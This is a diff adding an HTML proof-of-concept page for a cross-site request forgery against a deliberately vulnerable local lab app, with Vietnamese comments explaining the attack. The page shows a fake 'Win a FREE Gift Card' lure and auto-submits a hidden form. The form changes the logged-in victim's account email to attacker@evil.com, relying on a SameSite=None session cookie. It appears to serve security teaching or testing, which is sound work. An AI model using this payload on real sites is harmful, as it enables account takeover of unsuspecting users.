@@ -1,0 +1,20 @@
+<!--
+  CSRF PoC — F03 (deliberately vulnerable lab, local only)
+  Cách dùng: đăng nhập alice ở tab khác (http://localhost:5173),
+  rồi mở file này bằng browser (file:// hoặc localhost khác) → form tự submit.
+  Cookie session (SameSite=None) được browser gửi kèm dù request CROSS-SITE
+  → email của alice bị đổi thành attacker@evil.com mà alice không hề bấm gì.
+-->
+<!doctype html>
+<html>
+  <body>
+    <h1>Win a FREE Gift Card!</h1>
+    <p>Click to claim your prize...</p>
+    <form id="attack" method="POST" action="http://localhost:5173/api/profile/email">
+      <input type="hidden" name="newEmail" value="attacker@evil.com" />
+    </form>
+    <script>
+      document.getElementById('attack').submit();
+    </script>
+  </body>
+</html>
